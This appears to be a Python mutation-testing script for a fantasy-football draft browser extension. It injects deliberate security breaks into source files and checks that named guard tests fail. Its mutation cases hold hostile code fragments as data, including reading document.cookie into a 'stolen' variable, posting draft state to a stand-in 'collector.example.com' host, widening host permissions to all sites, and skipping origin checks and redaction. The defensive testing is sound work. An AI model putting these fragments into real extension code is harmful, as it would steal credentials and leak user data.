"""NF-C-LDA-0 — the RED PROOF for the extension red-line guard.

A green guard suite is not evidence that the guard works; it is equally consistent with a guard
that cannot fail (NF1.7(a) / INC-38 / NF-D17). This applies one deliberate break at a time and
asserts the NAMED clause goes red.

Three ways a red proof itself lies, all closed here:
  • the mutation never LANDS (#682)          → we assert the file content actually changed
  • the anchor is NOT UNIQUE (#885)          → we assert the anchor occurs exactly once
  • it lands but doesn't move the ASSERTION  → each break targets ONE clause, named per case,
    (#815)                                      and we require THAT test id to fail

Run:  uv run python extension/tools/red_proof.py
"""
from __future__ import annotations

import subprocess
import sys
from pathlib import Path

REPO = Path(__file__).resolve().parents[2]
SUITE = "betting_ml/tests/test_nf_c_lda_0_extension_red_line.py"
#: NF-C-LDA-1 added the OUTBOUND half — one host, the wire allowlist, break detection — so a case
#: now names WHICH suite it expects to go red.
SUITE_WIRE = "betting_ml/tests/test_nf_c_lda_1_extension_wire.py"
MANIFEST = REPO / "extension/manifest.json"
PROBE = REPO / "extension/src/main-world-probe.js"
CONTENT = REPO / "extension/src/content.js"
BACKGROUND = REPO / "extension/src/background.js"
OVERLAY = REPO / "extension/src/overlay.js"
AUTH = REPO / "extension/src/credence-auth.js"
STATE = REPO / "extension/src/draft-state.js"

# (label, file, anchor, replacement, the test id that MUST go red[, suite])
CASES = [
    ("manifest requests the `cookies` permission",
     MANIFEST, '"permissions": ["storage"]', '"permissions": ["storage", "cookies"]',
     "test_the_manifest_requests_no_credential_bearing_permission"),
    ("manifest host scope widened to every host",
     MANIFEST, '"https://fantasy.espn.com/football/draft*",\n    "https://api.credencesports.com/*"',
     '"*://*/*"',
     "test_the_manifest_host_scope_is_narrow"),
    ("probe reads document.cookie",
     PROBE, '  var CHANNEL = "__credence_draft_probe__";',
     '  var CHANNEL = "__credence_draft_probe__";\n  var stolen = document.cookie;',
     "test_no_source_reads_a_credential[document.cookie]"),
    ("probe ORIGINATES a fetch to ESPN",
     PROBE, '  installNetworkObservers();',
     '  fetch("https://lm-api-reads.fantasy.espn.com/apis/v3/x");\n  installNetworkObservers();',
     "test_no_source_originates_a_network_call[fetch(]"),
    ("probe stops wrapping fetch (abstains instead of observing)",
     PROBE, '        window.fetch = function () {', '        var disabled = function () {',
     "test_the_probe_really_does_wrap_rather_than_merely_abstain"),
    ("raw frame stored WITHOUT the redactor",
     PROBE, "entry.rawSample = redact(bodyText);", "entry.rawSample = bodyText;",
     "test_a_raw_frame_is_only_ever_stored_through_the_redactor"),
    ("raw frame capture unbounded (limit never applied)",
     PROBE, "      .slice(0, RAW_FRAME_LIMIT);", "      ;",
     "test_the_raw_frame_capture_is_bounded"),
    ("pool extractor grows a league-private field",
     PROBE, "          eligibleSlots: pl.eligibleSlots",
     "          eligibleSlots: pl.eligibleSlots,\n          ownership: pl.ownership",
     "test_the_pool_extractor_keeps_identity_fields_only[ownership]"),
    ("unreadable frames dropped silently again (predicate removed)",
     PROBE, "      } else if (!refused && entry.shape === null && bodyText === null",
     "      } else if (false) {",
     "test_an_unreadable_frame_is_COUNTED_rather_than_dropped"),
    ("binary decoder defined but never CALLED (wired-not-invoked)",
     PROBE, "                  recordCall(\"websocket-msg\", url, decodePrefix(d));",
     "                  recordCall(\"websocket-msg\", url, null);",
     "test_binary_frames_are_DECODED_rather_than_dropped"),
    ("xhr observer stops handling responseType='json'",
     PROBE, '              } else if (rt === "json") {', '              } else if (false) {',
     "test_the_xhr_observer_handles_every_response_representation"),
    ("a PII host is added to the body allowlist",
     PROBE, '    "fantasydraft.espn.com"            // the live draft socket',
     '    "fantasydraft.espn.com", "registerdisney.go.com"',
     "test_hosts_observed_carrying_pii_are_not_readable[registerdisney.go.com]"),
    ("the allowlist is declared but never applied",
     PROBE, "      var refused = !bodyCaptureAllowed(url);", "      var refused = false;",
     "test_an_off_allowlist_response_body_is_discarded_before_it_is_read"),
    ("the allowlist fails OPEN on an unparseable url",
     PROBE, "    } catch (e) { return false; }   // unparseable ⇒ refuse (fail CLOSED)",
     "    } catch (e) { return true; }",
     "test_the_allowlist_fails_closed_on_an_unparseable_url"),
    ("the sensitive-key scrub is never applied",
     PROBE, "      if (SENSITIVE_KEYS.test(k)) { out[k] = \"<omitted>\"; continue; }", "      ;",
     "test_sensitive_keys_are_omitted_from_a_summarized_body"),
    ("frames recorded once again (per-frame call removed)",
     PROBE, "          recordFramePattern(entry, bodyText);   // ⭐ EVERY frame, not just the first",
     "          ;",
     "test_every_frame_is_pattern_recorded_not_just_the_first"),
    ("frame-pattern overflow dropped silently",
     PROBE, "        entry.framePatternOverflow = (entry.framePatternOverflow || 0) + 1;", "        ;",
     "test_frame_pattern_capture_is_bounded_and_reports_its_overflow"),
    ("a frame example bypasses the redactor",
     PROBE, "      entry.framePatterns[pat] = { count: 1, example: redact(text) };",
     "      entry.framePatterns[pat] = { count: 1, example: text };",
     "test_a_stored_frame_example_goes_through_the_redactor"),
    ("a re-polled body is frozen again",
     PROBE, "      } else if (entry.shape !== null && bodyText && bodyText.length !== entry.bytes) {",
     "      } else if (false) {",
     "test_a_changed_body_is_reshaped_rather_than_frozen"),
    ("line-protocol TOKEN frame no longer redacted",
     PROBE, '      .replace(/^\\s*(TOKEN|AUTH|AUTHORIZE|SECURITY|CREDENTIAL)\\b.*/gim, "$1 <redacted>")',
     "      ",
     "test_a_line_protocol_secret_command_is_redacted_whole"),
    ("the redactor starts eating pick events",
     PROBE, '      .replace(/^\\s*(TOKEN|AUTH|AUTHORIZE|SECURITY|CREDENTIAL)\\b.*/gim, "$1 <redacted>")',
     '      .replace(/^\\s*(TOKEN|SELECTED)\\b.*/gim, "$1 <redacted>")',
     "test_the_redactor_does_not_eat_a_pick_event"),
    ("a refused body is mislabelled unreadable again",
     PROBE, "        entry.bodyNotRead = \"off-allowlist\";", "        ;",
     "test_an_off_allowlist_body_is_recorded_as_REFUSED_not_as_unreadable"),

    # ── NF-C-LDA-1: the OUTBOUND half ─────────────────────────────────────────────────────────
    ("an ESPN-context script ORIGINATES a request (the §3(c) costume)",
     CONTENT, "  var draft = null;", '  var draft = null;\n  fetch("https://x.example/");',
     "test_only_the_background_worker_can_reach_the_network", SUITE_WIRE),
    ("the worker posts the draft state somewhere other than our API",
     BACKGROUND, "    res = await fetch(API_ORIGIN + RECOMMEND_PATH, {",
     '    res = await fetch("https://collector.example.com/ingest", {',
     "test_the_background_reaches_exactly_one_host", SUITE_WIRE),
    ("the API endpoint becomes configurable",
     BACKGROUND, 'var API_ORIGIN = "https://api.credencesports.com";',
     'var API_ORIGIN = "https://api.credencesports.com";\nchrome.storage.local.get(["endpoint"]);',
     "test_the_api_origin_is_a_constant_and_not_configurable", SUITE_WIRE),
    ("the token handoff stops checking the sender's origin",
     BACKGROUND, '    if (origin !== "https://credencesports.com" && origin !== "https://www.credencesports.com") {',
     "    if (false) {",
     "test_the_token_handoff_is_origin_checked_and_scoped_to_our_own_site", SUITE_WIRE),
    ("the bearer token is persisted to DISK instead of memory",
     BACKGROUND, "      chrome.storage.session.get([TOKEN_KEY], function (got) {",
     "      chrome.storage.local.get([TOKEN_KEY], function (got) {",
     "test_the_token_handoff_is_origin_checked_and_scoped_to_our_own_site", SUITE_WIRE),
    ("an ESPN-context script gains access to our session",
     CONTENT, "  var lastAdviceKey = null;",
     "  var lastAdviceKey = null;\n  var t = localStorage.getItem('x');",
     "test_the_credence_token_never_enters_an_espn_context", SUITE_WIRE),
    ("the auth script MUTATES our site's session storage",
     AUTH, "      return newest;", "      localStorage.setItem('x', '1');\n      return newest;",
     "test_the_auth_script_only_reads_a_token_and_never_writes_one", SUITE_WIRE),
    ("the overlay builds DOM from a string",
     OVERLAY, "    root.textContent = \"\";", '    root.innerHTML = "";',
     "test_the_overlay_never_builds_dom_from_a_string", SUITE_WIRE),
    ("a BLOCKED read still renders recommendations",
     OVERLAY, '    if (view.verdict.level !== "blocked") {', "    if (true) {",
     "test_a_blocked_read_shows_no_recommendations", SUITE_WIRE),
    ("the overlay stops naming the pick it reasoned about",
     OVERLAY, '      ? "Reasoning about pick " + view.pickNumber',
     '      ? "Recommendation"',
     "test_the_overlay_states_the_pick_it_is_reasoning_about", SUITE_WIRE),
    ("the overlay grows a win-rate claim",
     OVERLAY, '      "Projection-based value, ranked for your league\u2019s scoring. Not betting advice and not a "',
     '      "Projection-based value with a proven win rate. Not betting advice and not a "',
     "test_the_overlay_carries_the_honest_framing", SUITE_WIRE),
    ("the wire forwards the whole pool row instead of the five identity fields",
     REPO / "extension/src/wire.js", "    return {\n      id: id,", "    return {\n      ...row,\n      id: id,",
     "test_no_credential_or_pii_survives_the_wire", SUITE_WIRE),
    ("break detection loses its staleness check",
     STATE, "if (since !== null && since > STALE_AFTER_MS) {", "if (false) {",
     "test_break_detection_distinguishes_broken_from_quiet", SUITE_WIRE),
]


def run_test(test_id: str, suite: str = SUITE) -> bool:
    """True when the named test PASSES."""
    r = subprocess.run(
        [sys.executable, "-m", "pytest", f"{suite}::{test_id}", "-q", "--no-header"],
        cwd=REPO, capture_output=True, text=True,
    )
    return r.returncode == 0


def main() -> int:
    failures = []
    for case in CASES:
        label, path, anchor, replacement, test_id = case[:5]
        suite = case[5] if len(case) > 5 else SUITE
        original = path.read_text()

        # (#885) the anchor must be UNIQUE, or the break can land on the wrong symbol and the
        # harness reports a FALSE "the guard is vacuous" — the dangerous direction, because it
        # invites weakening a correct guard.
        occurrences = original.count(anchor)
        if occurrences != 1:
            failures.append(f"{label}: anchor occurs {occurrences}× (must be exactly 1)")
            continue

        if not run_test(test_id, suite):
            failures.append(f"{label}: {test_id} was ALREADY RED before the break")
            continue

        mutated = original.replace(anchor, replacement, 1)
        try:
            path.write_text(mutated)
            # (#682) prove the mutation actually reached disk.
            assert path.read_text() != original, "mutation did not land"
            # (#815) prove the forbidden token is genuinely present now (or genuinely gone).
            went_red = not run_test(test_id, suite)
        finally:
            path.write_text(original)
            assert path.read_text() == original, f"FAILED TO RESTORE {path}"

        status = "RED ✓" if went_red else "STILL GREEN ✗"
        print(f"  {status}  {label}\n           → {test_id}")
        if not went_red:
            failures.append(f"{label}: {test_id} stayed GREEN on a deliberate break (VACUOUS)")

    print()
    if failures:
        print("RED PROOF FAILED:")
        for f in failures:
            print("  ✗", f)
        return 1
    print(f"RED PROOF PASSED — all {len(CASES)} clauses go red on their own deliberate break.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
